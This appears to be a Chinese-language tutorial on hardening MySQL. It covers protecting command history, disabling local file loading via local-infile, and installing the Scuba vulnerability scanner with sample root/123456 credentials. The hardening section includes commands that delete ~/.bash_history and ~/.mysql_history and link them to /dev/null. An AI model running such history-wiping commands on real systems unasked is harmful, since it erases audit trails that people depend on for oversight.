![image-20240723093927069](../../../../repo/assets/image-20240723093927069.png)

#####  (4)命令历史记录保护 

安全基线项说明：数据库相关的shell操作命令都会分别记录在.bash_history，如果这些⽂件不慎被读取，会导致数据库密码和数据库结构等信息泄露，⽽登陆数据库后的操作将记录在.mysql_history⽂件中，如果使⽤update表信息来修改数据库⽤户密码的话，也会被读取密码，

加固⽅法：

需要**删除这两个⽂件**，或者将**⽂件置空**

同时在进⾏登陆或备份数据库等与密码相关操作时，应该使⽤-p参数加⼊提示输⼊密码后，隐式输⼊密码

```
rm -f ~/.bash_history ~/.mysql_history
ln -s /dev/null ~/.bash_history
ln -s /dev/null ~/.mysql_history
```

```
ll ~/.bash_history ~/.mysql_history
cat ~/.bash_history && cat ~/.mysql_history
```

![image-20240723094843622](../../../../repo/assets/image-20240723094843622.png)

##### (5)禁⽌MySQL对本地⽂件存取 

安全基线项说明：在mysql中，提供对本地⽂件的**读取**，使⽤的是`load data infile`命令，默认在5.0版本中，该选项是默认打开的，该操作令会利⽤MySQL把本地⽂件读到数据库中，然后⽤户就可以⾮法获取敏感信息了，假如你不需要读取本地⽂件，请务必关闭。

加固⽅法：

- `local-infile=0`选项启动`mysqld`从服务器端禁⽤所有`load data infile`命令，假如需要获取本地⽂件，需要打开，但是建议关闭。

  ```
  local-infile=0
  
  [mysqld]
  local-infile=0
  ```

  ![image-20240723095126100](../../../../repo/assets/image-20240723095126100.png)

  ```
  systemctl restart mysqld
  ```

- 可以在my.cnf中添加local-infile=0，或者加参数local-infile=0

  ```
  show variables like "local%";
  ```

  ![image-20240723095338575](../../../../repo/assets/image-20240723095338575.png)

  在`5.7`设置依旧能读取外部文件

  ![image-20240723095824302](../../../../repo/assets/image-20240723095824302.png)

- 重新启动mysql。

  

### MySQL数据库的漏扫⼯具Scuba

#### 1.什么是Scuba

Scuba是⼀款数据库扫描软件，通过这款软件可以扫描你的数据库漏洞，让维护⼈员可以⽴即找到不安全的因素， 从⽽提升数据库安全等级，及时解决漏洞问题；数据库保存的资源是⾮常多的，⼀旦你的数据库出现漏洞就可能导 致数据丢失或者是被盗取，所以及时维护数据库是⾮常有必要的，Scuba软件就可以帮助你发现数据库存在的漏洞 以及相关的缺陷问题，⽀持Oracle，SQL Server，SAP Sybase，IBM DB2和MySQL等数据库测试，提供上千个项 ⽬测试。

#### 2.Scuba的安装  

##### (1)Windows下安装  

第⼀步，在教学配套⼯具中找到`jdk8`，然后安装

![image-20240723101218451](../../../../repo/assets/image-20240723101218451.png)

第⼆步，解压`Scuba-Windows.zip`到⾃⼰指定的⽬录。

第三步，解压`mysql-connector-java-5.1.44.zip`到⾃⼰指定的⽬录。

![image-20240723101354487](../../../../repo/assets/image-20240723101354487.png)

第四步，进⼊mysql-connector-java-5.1.44⽬录，找到`mysql-connector-java-5.1.44-bin.jar`⽂件，将它复制。

第五步，进⼊Scuba-Windows⽬录，依次进⼊`ODBC-->Production-->MYSQL`⽬录，将mysql-connector-java 5.1.44-bin.jar粘贴这⾥。

![image-20240723101448774](../../../../repo/assets/image-20240723101448774.png)

第六步，回到Scuba-Windows⽬录，双击运⾏`Scuba.exe`⽂件。

第七步，依次填写⽬标MySQL服务器的IP、端⼝、数据库⽤户、数据库密码、要扫描的库等信息，点击Go开始扫 描。

```
⽬标MySQL服务器的IP: 192.168.70.14
端⼝:3306
数据库⽤户:root
数据库密码:123456
要扫描的库:mysql
```

![image-20240723101636687](../../../../repo/assets/image-20240723101636687.png)

第⼋步，扫描完成后，会⾃动打开浏览器，以⽹⻚的形式将扫描内容展示。

![image-20240723101844861](../../../../repo/assets/image-20240723101844861.png)

![image-20240723103719302](../../../../repo/assets/image-20240723103719302.png)

##### (2)Linux下安装

第⼀步，在教学配套⼯具中找到`jdk-8u391-linux-x64.rpm`和`Scuba-Linux-x64.tar.gz`和`mysql-connector-java 5.1.44.tar.gz`这三个安装⽂件，上传到Linux虚拟机。 

![image-20240723104448228](../../../../repo/assets/image-20240723104448228.png)

第⼆步，在终端中打开jdk rpm包所在的⽬录。 

![image-20240723104643965](../../../../repo/assets/image-20240723104643965.png)

第三步，使⽤yum命令安装jdk rpm包。

```
yum localinstall jdk-8u391-linux-x64.rpm
```

![image-20240723104133127](../../../../repo/assets/image-20240723104133127.png)

第四步，解压Scuba-Linux-x64.tar.gz。

```
tar zxf Scuba-Linux-x64.tar.gz
```

第五步，解压mysql-connector-java-5.1.44.tar.gz。

```
tar zxf mysql-connector-java-5.1.44.tar.gz
```

![image-20240723104802893](../../../../repo/assets/image-20240723104802893.png)

第六步，进⼊mysql-connector-java-5.1.44，将mysql-connector-java-5.1.44-bin.jar拷⻉到Scuba的MySQL⽬录 下。

```
cd mysql-connector-java-5.1.44/
cp mysql-connector-java-5.1.44-bin.jar ../Scuba-Linux-x64/Scuba/ODBC/Production/MYSQL/
```

```
ls /root/scuba/Scuba-Linux-x64/Scuba/ODBC/Production/MYSQL/
```

![image-20240723105040394](../../../../repo/assets/image-20240723105040394.png)

第七步，进⼊Scuba-Linux-x64⽬录，运⾏Scuba.sh。

```
cd ../Scuba-Linux-x64/
sh Scuba.sh
```

第⼋步，同意Scuba协议，然后选择MySQL数据库，依次填写连接信息，点击Go开始扫描。

![image-20240723105147741](../../../../repo/assets/image-20240723105147741.png)

第九步，扫描完成后，会⾃动打开浏览器，以⽹⻚的形式将扫描内容展示。

![image-20240723105232915](../../../../repo/assets/image-20240723105232915.png)
